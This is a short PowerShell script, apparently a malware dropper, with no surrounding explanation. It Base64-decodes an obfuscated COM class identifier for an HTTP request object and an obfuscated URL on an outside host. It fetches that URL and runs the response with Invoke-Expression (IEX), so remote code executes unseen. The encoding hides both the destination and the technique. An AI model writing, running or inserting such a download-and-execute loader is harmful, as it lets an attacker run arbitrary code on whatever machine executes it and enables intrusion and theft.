function cr($Text){
return  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Text))
}
$cid=cr("RgA1ADAANwA4AEYAMwA1AC0AQwA1ADUAMQAtADEAMQBEADMALQA4ADkAQgA5AC0AMAAwADAAMABGADgAMQBGAEUAMgAyADEA")
$u=cr("aAB0AHQAcAA6AC8ALwBkAGUAZgBlAG4AYwBlAGQAcgBvAGQALgBpAG4ALwBoAGcAawBzAGQAaABnAGkAbwBoAC8AcwB0AGEA")
$o = [activator]::CreateInstance([type]::GetTypeFromCLSID($cid)); $o.Open("GET", $u, $False); $o.Send(); IEX $o.responseText;
